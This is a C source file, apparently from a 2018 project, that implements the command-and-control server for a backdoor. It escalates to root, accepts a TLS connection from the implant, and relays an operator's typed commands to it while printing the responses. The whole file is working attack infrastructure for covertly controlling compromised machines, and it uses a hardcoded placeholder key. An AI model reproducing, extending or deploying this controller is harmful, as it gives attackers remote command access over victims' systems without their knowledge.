/*
 * Author and Designer: John Agapeyev
 * Date: 2018-09-22
 * Notes:
 * The C2 server for sending and receiving messages with the backdoor
 */

#include <assert.h>
#include <linux/tcp.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <termios.h>
#include <unistd.h>

#include "crypto.h"
#include "shared.h"

static unsigned char key[KEY_LEN];

/*
 * function:
 *    main
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Splits into read and write process based off a shared TLS socket
 * Basically does manual I/O for the C2 channel
 */
int main(void) {
    if (setuid(0)) {
        perror("setuid");
        exit(EXIT_FAILURE);
    }
    if (setgid(0)) {
        perror("setgid");
        exit(EXIT_FAILURE);
    }

    memset(key, 0xab, KEY_LEN);

    init_openssl();
    SSL_CTX* ctx = create_context();
    configure_context(ctx);

    //TCP recv loop
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    if (setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0) {
        perror("setsockopt(SO_REUSEADDR)");
    }

    struct sockaddr_in sin;
    sin.sin_addr.s_addr = INADDR_ANY;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    if (bind(listen_sock, (struct sockaddr*) &sin, sizeof(struct sockaddr_in)) == -1) {
        perror("bind");
        return EXIT_FAILURE;
    }
    listen(listen_sock, 5);

    int conn_sock = accept(listen_sock, NULL, 0);

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, conn_sock);

    if (SSL_accept(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        return EXIT_FAILURE;
    }

    unsigned char buffer[MAX_PAYLOAD];

    switch (fork()) {
        case 0: {
            setvbuf(stdin, NULL, _IONBF, 0);
            setvbuf(stdout, NULL, _IONBF, 0);
            for (;;) {
                int size = read(STDIN_FILENO, buffer, MAX_PAYLOAD);
                if (size < 0) {
                    perror("read");
                    break;
                }
                if (size == 0) {
                    printf("Read zero\n");
                    break;
                }
                SSL_write(ssl, buffer, size);
            }
        } break;
        case -1:
            perror("fork()");
            exit(EXIT_FAILURE);
        default: {
            int size;
            while ((size = SSL_read(ssl, buffer, MAX_PAYLOAD)) > 0) {
                for (int i = 0; i < size; ++i) {
                    printf("%c", buffer[i]);
                }
                fflush(stdout);
            }
            if (size < 0) {
                printf("err1 %d\n", SSL_get_error(ssl, size));
                long e = ERR_get_error();
                printf("err2 %s\n", ERR_error_string(e, NULL));
                printf("err3 %s\n", ERR_lib_error_string(e));
                printf("err4 %s\n", ERR_func_error_string(e));
                printf("err5 %s\n", ERR_reason_error_string(e));
            }
        } break;
    }
    setvbuf(stdin, NULL, _IOLBF, 0);
    setvbuf(stdout, NULL, _IOLBF, 0);

    SSL_free(ssl);

    close(listen_sock);

    SSL_CTX_free(ctx);

    cleanup_openssl();

    return EXIT_SUCCESS;
}
